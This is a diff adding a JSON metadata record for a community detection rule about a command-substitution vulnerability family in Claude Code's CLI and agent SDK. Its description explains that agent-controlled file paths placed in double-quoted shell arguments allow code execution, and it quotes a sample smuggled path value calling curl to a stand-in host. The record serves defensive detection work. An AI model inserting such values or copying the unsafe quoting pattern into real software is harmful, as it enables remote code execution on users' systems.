@@ -1,0 +1,21 @@
+{
+  "uuid": "e3c25a25-0c75-4dc4-94f1-eacf4d96650a",
+  "title": "Claude Code Shell Metacharacter in Double-Quoted File Path",
+  "format": "atr",
+  "author": "ATR Community (cve-pipeline)",
+  "license": "MIT",
+  "license_verified": true,
+  "description": "Detects the CVE-2026-35021/35020/35022 family in Claude Code CLI and Claude Agent SDK (disclosed 2026-05-15, CVSS 8.4). The root cause is POSIX §2.2.3 — `$()` command substitution and backtick command substitution remain active inside double quotes. In Claude Code's `promptEditor.ts`, file paths from agent-controlled context were interpolated into double-quoted shell arguments passed to `execSync`, letting a path like `\"$(curl evil)\"` execute attacker code. Generalizes beyond Claude Code: any agent that double-quote-wraps a user/agent-controlled file path before passing to a shell tool inherits this RCE primitive. The detection target is a path-shaped argument containing a `$(...)` or backtick command substitution inside double quotes.\n",
+  "source": "https://github.com/Agent-Threat-Rule/agent-threat-rules",
+  "tags": [
+    "tlp:clear",
+    "PAP:CLEAR"
+  ],
+  "attack_techniques": [],
+  "cve": [
+    "CVE-2026-35021"
+  ],
+  "created_at": "2026-06-18",
+  "last_modified": "2026-06-18",
+  "rulezet_url": "https://rulezet.org/rule/detail_rule/232238"
+}
